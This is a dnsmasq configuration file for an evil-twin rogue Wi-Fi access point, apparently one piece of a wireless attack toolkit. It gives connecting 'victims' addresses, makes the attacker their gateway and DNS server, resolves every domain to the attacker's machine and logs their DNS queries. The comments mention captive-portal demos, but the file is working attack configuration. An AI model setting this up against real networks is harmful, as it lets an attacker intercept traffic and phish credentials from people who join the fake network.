# DHCP + DNS hijack for the rogue AP.
# Used by scripts/06-evil-twin-up.sh

interface=wlan2
bind-interfaces

# DHCP pool handed to victims when they associate.
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1   # default gateway -> us
dhcp-option=6,10.0.0.1   # DNS server     -> us

# DNS hijack: every domain resolves to the AP itself.
# Useful for captive-portal demos. Comment this line out if you want
# victims to resolve real DNS through us instead.
address=/#/10.0.0.1

log-queries
log-facility=/var/log/dnsmasq-rogue.log
